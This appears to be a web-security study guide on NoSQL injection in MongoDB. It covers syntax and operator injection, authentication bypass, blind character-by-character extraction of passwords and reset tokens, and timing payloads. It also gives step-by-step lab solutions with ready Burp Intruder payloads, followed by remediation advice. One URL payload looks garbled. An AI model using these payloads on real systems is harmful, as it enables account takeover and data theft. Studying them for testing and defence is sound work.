1. **INTRODUCTION**

**NoSQL Injection** occurs when an application fails to sanitize client-controlled data before embedding it into structured, non-relational database queries. Unlike standard relational SQL engines that parse standardized ANSI-SQL text statements, NoSQL database engines utilize highly varied execution models—including JSON-based document schemas, array mappings, and integrated procedural language engines (such as embedded JavaScript v8 engines inside MongoDB).

An attacker exploiting a NoSQL interface can alter the execution logic to bypass authentication controls, exfiltrate sensitive backend data stores, perform Denial of Service (DoS) actions, or execute arbitrary code directly within the database management context.

- ### NoSQL Syntax Injection

Syntax injection arises when user input breaks out of the wrapping data boundaries to corrupt the query interpreter's execution flow. This typically impacts NoSQL endpoints that pass data parameters into server-side JavaScript evaluation functions (like MongoDB's `$where` block or `mapReduce()`).

- #### Fuzz Testing and Breakout Signatures

Identifying syntax issues involves injecting layout control symbols to force the query builder to drop unhandled error blocks or generate recognizable logical deviations:

- **Fuzz Baseline Payload:** `'"``{\n;$Foo}\n$Foo \xYZ\u0000`
    
- **MongoDB JavaScript Breakout:** Injecting a single quote (`'`) converts an internal evaluation statement like `this.category == 'USER_INPUT'` into an unbalanced, structurally malformed expression:
    
    JavaScript
    
    ```
    this.category == 'fizzy''
    ```
    
    If the application responds with an unhandled server error or a visible JavaScript syntax error snippet, input validation is absent. This can be confirmed by passing a balance-corrected, escaped quote value (`\'`):
    
    JavaScript
    
    ```
    this.category == 'fizzy\''
    ```
    
    If the escaped expression restores the page to its standard operational state, a server-side syntax injection vulnerability exists.
    

- #### Forcing Arbitrary Boolean Overrides

Once a breakout sequence is confirmed, an attacker can manipulate conditional logic using boolean connectors (`&&`, `||`):

- **Logical False Verification:** `fizzy' && 0 && 'x` (The application drops the records because the total evaluation statement resolves to false).
    
- **Logical True Verification:** `fizzy' && 1 && 'x` (The application pulls the standard records matching the target filter because the condition resolves to true).
    
- **Global Structural Override:** `fizzy' || '1' == '1` (The injection forces the statement to resolve to true across every row evaluated, rendering the input filter useless and dumping the collection).
    

JavaScript

```
// Resulting Backend Query Processing a Global Override
this.category == 'fizzy' || '1' == '1'
```

> ⚠️ **Data Integrity Warning:** Use extreme caution when executing global conditional overrides (`|| 1`) on active endpoints. If the targeted parameter is re-used internally by the application within background `UPDATE` or `DELETE` query routines, a global true injection can trigger catastrophic, unintended multi-row data loss.

- #### Null Byte Query Truncation

In specific database engines like older iterations of MongoDB, the null character (`%00` or `\u0000`) acts as a hard string terminator within internal C++ drivers. Injecting a null byte cuts off all subsequent filter properties configured downstream by the application developers (such as automated visibility rules or release flags):

- **Original Application Intent:** `this.category == 'USER_INPUT' && this.released == 1`
    
- **Injected Manipulation:** `fizzy'%00`
    
- **Interpreted Database Query:** `this.category == 'fizzy'` (The trailing requirement `this.released == 1` is completely truncated, exposing hidden or unreleased records).
    

- ### NoSQL Operator Injection

Operator injection occurs when an application accepts user-supplied parameters as structured objects rather than literal string primitives. By passing native database evaluation operators, an attacker can manipulate query filters without needing to break the application's underlying data syntax.

- #### Core MongoDB Query Operators

- `$ne`: Matches all records that are **not equal** to the provided argument value.
    
- `$in`: Matches any values that exist inside a client-defined **array set**.
    
- `$regex`: Filters collection properties against a specific **regular expression** pattern.
    
- `$where`: Evaluates documents against a server-side **JavaScript expression string**.
    

- #### Payload Structures: JSON vs URL Formats

If the target endpoint ingests raw JSON blocks, operators are injected by modifying string properties into nested objects. If the application processes URL parameters, attackers can use PHP-style bracket arrays (`field[operator]=value`) to force the backend framework to parse the parameters as an object structure.

|Context Type|Standard Content Format|Injected Operator Payload|
|---|---|---|
|**JSON Payload**|`{"username": "wiener"}`|`{"username": {"$ne": "invalid"}}`|
|**URL Parameters**|`username=wiener`|`username[$ne]=invalid`|

- #### Authentication Bypass via Operator Injection

Consider a typical backend login routine validating credentials via a JSON document filter:

JSON

```
{"username": "USER_INPUT", "password": "USER_INPUT"}
```

By injecting the `$ne` operator into both parameter inputs, an attacker can bypass the password check entirely:

JSON

```
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
```

The database executes a query for any user document where the username and password do not match the string `"invalid"`. The database returns the first record found in the index collection, logging the attacker into the system as that user (often the administrator).

## 2. Advanced Exfiltration & Data Extraction

- ### Data Exfiltration via Server-Side JavaScript Injection

When a NoSQL query uses evaluation utilities like `$where`, an attacker can use boolean data exfiltration techniques to extract sensitive fields character by character.

- #### Extracting Field Values

If an attacker injects a JavaScript array bracket look-up combined with a conditional test, they can infer individual characters based on how the server responds (e.g., tracking a valid data block versus a `Could not find user` error message):

Plaintext

```
admin' && this.password[0] == 'a' || 'a'=='b
```

Alternatively, regex match checks can speed up discovery by scanning for character classifications (like checking for digit blocks):

Plaintext

```
admin' && this.password.match(/\d/) || 'a'=='b
```

- #### Blind Schema and Field Discovery

Because NoSQL databases are schema-less, field names can vary between records. To exfiltrate a hidden or unknown field name, use the native JavaScript reflection method `Object.keys(this)` to grab the property headers by index array positions:

JavaScript

```
// Probing the second property name attribute of the active document index
Object.keys(this)[1].match('^a.*')
```

Iterating through the character offsets allows an attacker to map out the exact names of custom attributes (e.g., discovering internal flags like `passwordResetToken` or `is_admin`) before exfiltrating their values.

- ### NoSQL Operator Injection for Data Extraction

When direct JavaScript execution (via `$where`) is completely blocked, an attacker can still exfiltrate data character-by-character using query operators that evaluate string patterns. The **`$regex` (Regular Expression)** operator is the primary mechanism for this type of blind extraction.

- #### Character-by-Character Enumeration

1. **Establish a Baseline:** Inject an all-matching wildcard regex pattern to verify the operator is processed correctly:
    
    JSON
    
    ```
    {"username":"admin","password":{"$regex":"^.*"}}
    ```
    
2. **Sequential Anchor Probing:** Use the regex positional start anchor (`^`) to systematically guess individual characters of the target data string (e.g., a password):
    
    JSON
    
    ```
    {"username":"admin","password":{"$regex":"^a.*"}}
    ```
    
    If the server returns a successful authentication session or a distinct "Account locked" error rather than an "Invalid credentials" error, it confirms that the character `a` is the correct first index character.
    

- ### Timing-Based NoSQL Injection (Blind Execution)

When a vulnerable application suppresses database errors and handles both true and false conditional responses identically, an attacker can use side-channel timing analysis to infer state anomalies.

- #### Injected Delay Routines

By force-injecting operational loops or blocking database commands into a server-side JavaScript engine context, an attacker can intentionally hold the backend connection open if a specific condition is satisfied.

- **Global Evaluation Halt Payload:**
    
    JSON
    
    ```
    {"$where": "sleep(5000)"}
    ```
    
- **Conditional Boolean Timing Payloads:** If native timing utilities like `sleep()` are stripped, a custom JavaScript execution loop can be injected via string concatenation to consume CPU clock cycles until a designated time limit expires:
    
    Plaintext
    
    ```
    // Custom execution loop payload if first password character is 'a'
    admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
    ```
    
    Plaintext
    
    ```
    // Standard conditional block if first password character is 'a'
    admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
    ```
    
    If the application's response delivery time stalls matching the injected baseline millisecond delay value, the boolean condition is true.
## 3. Solutions & Payloads (NoSQL)

### Lab 1: Detecting NoSQL injection

- **Vulnerability:** Vulnerable URL category parameter allows syntax injection into a server-side JavaScript evaluation block.
    
- **Solution Steps:**
    
    1. Intercept a category filter request via Burp Suite and send it to **Repeater**.
        
    2. Inject a single quote (`'`) to trigger a visible syntax error, confirming an open breakout path.
        
    3. Verify conditional behavior by testing a true condition statement:
        
        Plaintext
        
        ```
        /filter?category=Gifts'%20%26%26%201%20%26%26%20'x
        ```
        
        This returns only standard `Gifts` category records.
        
    4. Inject a global logical override payload to force the condition to evaluate to true across all records, and URL-encode the string using `Ctrl+U`:
        
        Plaintext
        
        ```
        /filter?category=Gifts'%7|%7|1%7|%7|'
        ```
        
    5. Load the modified request in the browser to view the unreleased database products and complete the lab.
        

### Lab 2: Exploiting NoSQL operator injection to bypass authentication

- **Vulnerability:** The JSON body parameter parser accepts object structures, allowing MongoDB operator injection on authentication fields.
    
- **Solution Steps:**
    
    1. Capture the `POST /login` request containing JSON payload elements.
        
    2. Inject the `$ne` operator into the password string to test parameter vulnerability:
        
        JSON
        
        ```
        {"username":"wiener", "password":{"$ne":"invalid"}}
        ```
        
    3. Target the administrator account by using a regex match operator (`$regex`) to bypass the strict password check:
        
        JSON
        
        ```
        {"username":{"$regex":"admin.*"}, "password":{"$ne":"invalid"}}
        ```
        
    4. Generate a login response token, right-click to select **Show response in browser**, and paste the link into Burp's browser to log in as the administrator.
        

### Lab 3: Exploiting NoSQL injection to extract data

- **Vulnerability:** Blind boolean NoSQL data extraction via server-side JavaScript execution flaws.
    
- **Solution Steps:**
    
    1. Identify that passing a quote (`'`) into the `GET /user/lookup?user=wiener` path breaks query execution.
        
    2. Verify boolean responses by testing true and false expressions:
        
        - `wiener' && '1'=='2` returns `Could not find user`.
            
        - `wiener' && '1'=='1` successfully returns user details.
            
    3. Determine the administrator's password length by incrementing length checks until a false condition error triggers:
        
        Plaintext
        
        ```
        administrator' && this.password.length < 30 || 'a'=='b
        ```
        
        The password length is confirmed to be exactly **8 characters** (since length 9 returns true, while length 8 fails).
        
    4. Send the request to **Intruder** and configure a **Cluster Bomb** attack over two payload positions:
        
        Plaintext
        
        ```
        user=administrator'%20%26%26%20this.password[%C2%A70%C2%A7%255d%3d%3d'%C2%A7a%C2%A7
        ```
        
    5. Set **Payload 1** to a numeric range from `0` to `7` (character indexes), and **Payload 2** to a character list (`a-z`).
        
    6. Run the attack, sort the results by length or response status to extract the matching characters for each index position, and use the reconstructed password to log in as the administrator.
        

### Lab 4: Exploiting NoSQL operator injection to extract unknown fields

- **Vulnerability:** Object parameter acceptance allows `$where` JavaScript extraction of internal document schema attributes.
    
- **Solution Steps:**
    
    1. Test operator flexibility on the `POST /login` endpoint by injecting a nested object:
        
        JSON
        
        ```
        {"username":"carlos", "password":{"$ne":"invalid"}}
        ```
        
        The application returns an `Account locked` error message, confirming operator parsing is active.
        
    2. Verify that arbitrary JavaScript is being evaluated by adding a trailing `$where` query logic parameter:
        
        - `"$where": "0"` returns `Invalid username or password`.
            
        - `"$where": "1"` returns `Account locked`.
            
    3. Send the request to **Intruder** using a **Cluster Bomb** layout to brute-force the names of hidden JSON fields using object key matching:
        
        JSON
        
        ```
        {"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"}
        ```
        
    4. Map the characters that trigger an `Account locked` response to discover a hidden password reset token field name.
        
    5. Test the exfiltrated field name against known account paths (e.g., `GET /forgot-password?YOURTOKENNAME=invalid`). An `Invalid token` error confirms the parameter name is correct.
        
    6. Reconfigure **Intruder** to extract the token's value by targeting the newly discovered property name:
        
        JSON
        
        ```
        "$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
        ```
        
    1. Extract the valid token value, submit it to the endpoint (`/forgot-password?YOURTOKENNAME=TOKENVALUE`), change Carlos's password, and log in to his account.

## 4. Remediation & Prevention Defense Models (NoSQL)

To secure NoSQL deployment layers against syntax breakouts, operator manipulations, and blind side-channel exfiltration, apply these defensive controls:

- ### Avoid Dynamic Query Concatenation

- Never dynamically concatenate raw user input strings directly into backend query expressions or evaluate them inside database-level JavaScript objects (such as MongoDB's `$where`, `$runCommand`, or `mapReduce`).
    
- Enforce **parameterized object construction** natively, handling all data imports strictly as literal data types rather than executable statements.
    

- ###  Strict Input Type Validation & Allow-listing

- Apply strong, strict schema validation controls to all incoming client data points using an execution guard wrapper like Zod, Joi, or built-in JSON schemas.
    
- Sanitize character elements against rigid character allow-lists, dropping any input strings that contain atypical operator metadata characters.
    

- ### Restricting Object Parameter Binding (Operator Defenses)

- To prevent data-structure operator injections (such as passing a nested `{"$ne": ""}` object where a string primitive is expected), explicitly validate input variable types.
    
- Reject any complex object types or nested arrays where flat, literal string parameters are required. If using URL parser frameworks (like `qs` or `body-parser`), ensure they are configured to drop bracketed array structures (`field[operator]`) completely.
    

- ### Hardening Database Operational Permissions

- Lock down backend database privileges to follow the **Principle of Least Privilege**. Ensure the web application connects using an account restricted solely to necessary collections.
    
- Explicitly turn off server-side JavaScript evaluation properties within the core database configuration profiles (e.g., setting `security.javascriptEnabled: false` inside `mongod.conf`) to neutralize syntax injection vectors entirely.